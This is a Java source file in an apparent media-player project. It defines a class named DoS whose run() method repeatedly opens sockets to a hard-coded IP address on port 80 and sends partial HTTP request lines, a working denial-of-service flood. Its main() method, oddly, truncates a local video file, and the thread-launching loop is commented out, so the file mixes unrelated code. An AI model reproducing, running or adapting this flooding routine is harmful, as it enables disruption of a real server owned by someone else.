package cz.encircled.eplayer.app;


    import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.net.UnknownHostException;
    import java.nio.file.Files;
    import java.nio.file.Path;
    import java.nio.file.Paths;

/**
 * Created by IntelliJ IDEA.
 * User: steven
 * Date: 18-Oct-2008
 * Time: 21:10:28
 */
public class DoS extends Socket implements Runnable {
    static DoS _instance = new DoS();
    final String TARGET = "81.177.139.43";
    //   81.177.139.43

    public static void main(String[] args) throws IOException {
//        for (int i = 0; i < 10; i++)
//            new Thread(_instance).start();
        Path path = Paths.get("D:\\video\\Breaking Bad S2\\test.avi");
        Path pathWrite = Paths.get("D:\\video\\Breaking Bad S2\\test2222.avi");
        byte[] data = Files.readAllBytes(path);
        int l1 = (int) (data.length * 0.3);
        byte[] dataToWrite = new byte[l1];
        System.arraycopy(data, 0, dataToWrite, 0, l1);
        Files.write(pathWrite, dataToWrite);
    }

    public void run() {
        for (int i = 1; i < 1000000; i++) {
            try {
                Socket net = new Socket(TARGET, 80); // connects the Socket to the TARGET port 80.
                sendRawLine("GET / HTTP/1.1", net); // Sends the GET / OutputStream
                sendRawLine("Host: " + TARGET, net); // Sends Host: to the OutputStream
                System.out.println("Current Connection: " + i);
            } catch (UnknownHostException e) {
                System.out.println("DDoS.run: " + e);
            } catch (IOException e) {
                System.out.println("DDoS.run: " + e);
            }
        }
    }

    public static void sendRawLine(String text, Socket sock) {
        try {
            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
            out.write(text + " ");
            out.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}